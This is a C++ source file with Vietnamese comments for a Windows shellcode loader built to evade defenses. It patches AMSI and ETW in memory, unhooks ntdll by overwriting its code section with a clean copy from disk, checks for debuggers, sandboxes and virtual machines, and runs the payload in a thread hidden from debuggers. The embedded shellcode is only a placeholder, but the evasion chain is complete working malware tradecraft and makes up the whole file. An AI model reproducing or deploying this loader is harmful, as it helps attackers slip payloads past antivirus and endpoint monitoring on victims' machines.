#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <stdint.h>
#include <string>
#include <vector>

#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(OUT PHANDLE, IN ACCESS_MASK, IN PVOID, IN HANDLE, IN PVOID, IN PVOID, IN ULONG, IN SIZE_T, IN SIZE_T, IN SIZE_T, IN PVOID);
typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc = nullptr;
NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = nullptr;
NtCreateThreadEx_t NtCreateThreadExFunc = nullptr;
NtQueryInformationProcess_t NtQueryInformationProcessFunc = nullptr;

extern "C" NTSTATUS NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);

// --- Patch AMSI ---
void PatchAMSI()
{
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
    void* amsiScanBuffer = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!amsiScanBuffer) return;

    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(amsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(amsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}

// --- Patch ETW ---
void PatchETW()
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    void* etwEventWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!etwEventWrite) return;

    BYTE patch[] = { 0xC3 }; // ret
    DWORD oldProtect;
    VirtualProtect(etwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(etwEventWrite, patch, sizeof(patch));
    VirtualProtect(etwEventWrite, sizeof(patch), oldProtect, &oldProtect);
}

// --- Unhook ntdll syscall ---
bool UnhookSyscall()
{
    char sysPath[MAX_PATH];
    GetSystemDirectoryA(sysPath, MAX_PATH);
    strcat_s(sysPath, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return false;
    }

    BYTE* fileBuffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fileBuffer) {
        CloseHandle(hFile);
        return false;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL)) {
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return false;
    }
    CloseHandle(hFile);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        return false;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
    DWORD sizeOfCode = ntHeaders->OptionalHeader.SizeOfCode;
    DWORD codeBaseOffset = ntHeaders->OptionalHeader.BaseOfCode;

    BYTE* srcCode = fileBuffer + codeBaseOffset;
    BYTE* destCode = (BYTE*)hNtdll + codeBaseOffset;

    DWORD oldProtect;
    if (!VirtualProtect(destCode, sizeOfCode, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        return false;
    }

    memcpy(destCode, srcCode, sizeOfCode);

    VirtualProtect(destCode, sizeOfCode, oldProtect, &oldProtect);
    VirtualFree(fileBuffer, 0, MEM_RELEASE);

    return true;
}

// --- Check debugger via PEB flag ---
bool CheckPEBBeingDebugged() {
    #if defined(_MSC_VER)
    __try {
        return (*(BYTE*)(__readfsdword(0x30) + 2)) != 0;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    #else
    return false;
    #endif
}

// --- Check DebugObjectHandle via NtQueryInformationProcess ---
bool CheckDebugObject() {
    if (!NtQueryInformationProcessFunc) return false;
    HANDLE hProcess = GetCurrentProcess();
    HANDLE debugObject = NULL;
    ULONG retLen = 0;
    NTSTATUS status = NtQueryInformationProcessFunc(hProcess, (PROCESSINFOCLASS)0x1e, &debugObject, sizeof(debugObject), &retLen);
    if (status == 0 && debugObject != NULL) return true;
    return false;
}

// --- Timing check anti-debug ---
bool TimingCheck() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(10);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000.0;
    // Nếu thời gian sleep bị rút ngắn (giả lập/debug), trả false
    return elapsed < 9.0;
}

// --- Check sandbox/VM by registry và MAC đơn giản ---
bool CheckVM() {
    // Kiểm tra registry thường dùng bởi VM
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\vmhgfs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    // Kiểm tra MAC VM phổ biến
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        for (int i = 0; i < 16 && AdapterInfo[i].AddressLength == 6; i++) {
            BYTE* mac = AdapterInfo[i].Address;
            if ((mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) || // VMWare
                (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) ||
                (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x14)) {
                return true;
            }
        }
    }
    return false;
}

// --- Kiểm tra tổng hợp debug/VM ---
bool IsDebugOrVM()
{
    if (CheckPEBBeingDebugged()) return true;
    if (CheckDebugObject()) return true;
    if (!TimingCheck()) return true;
    if (CheckVM()) return true;
    return false;
}

// --- Cấp phát vùng nhớ RWX ---
void* AllocateRWXMemory(SIZE_T size) {
    PVOID base = nullptr;
    NTSTATUS status = NtAllocateVirtualMemoryFunc(GetCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) return nullptr;
    return base;
}

// --- Thay đổi phân quyền bộ nhớ ---
bool ChangeMemoryProtect(void* base, SIZE_T size, ULONG newProtect, ULONG* oldProtect) {
    NTSTATUS status = NtProtectVirtualMemoryFunc(GetCurrentProcess(), &base, &size, newProtect, oldProtect);
    return status == 0;
}

// --- Tạo thread ẩn chạy shellcode ---
bool CreateRemoteThreadHidden(void* startAddress) {
    HANDLE hThread = nullptr;
    NTSTATUS status = NtCreateThreadExFunc(&hThread, THREAD_ALL_ACCESS, nullptr, GetCurrentProcess(), startAddress, nullptr, FALSE, 0, 0, 0, nullptr);
    if (status != 0) return false;

    // Ẩn thread khỏi debugger bằng NtSetInformationThread
    typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(HANDLE, THREADINFOCLASS, PVOID, ULONG);
    NtSetInformationThread_t NtSetInformationThread = (NtSetInformationThread_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
    if (NtSetInformationThread) {
        const ULONG HideFromDebugger = 0x11;
        NtSetInformationThread(hThread, (THREADINFOCLASS)HideFromDebugger, nullptr, 0);
    }

    CloseHandle(hThread);
    return true;
}

// --- Hàm chính reflective shellcode load ---
int ReflectiveShellcodeLoad(const unsigned char* shellcode, size_t shellcode_size) {
    if (IsDebugOrVM()) return -1;

    PatchAMSI();
    PatchETW();
    UnhookSyscall();

    void* exec_mem = AllocateRWXMemory(shellcode_size);
    if (!exec_mem) return -2;

    memcpy(exec_mem, shellcode, shellcode_size);

    ULONG oldProtect = 0;
    if (!ChangeMemoryProtect(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -3;
    }

    if (!CreateRemoteThreadHidden(exec_mem)) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -4;
    }

    return 0;
}

int main() {
    NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    NtCreateThreadExFunc = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    NtQueryInformationProcessFunc = (NtQueryInformationProcess_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (!NtAllocateVirtualMemoryFunc || !NtProtectVirtualMemoryFunc || !NtCreateThreadExFunc || !NtQueryInformationProcessFunc)
        return -1;

    const unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0xC3 // Ví dụ NOP NOP NOP RET
    };

    return ReflectiveShellcodeLoad(shellcode, sizeof(shellcode));
}
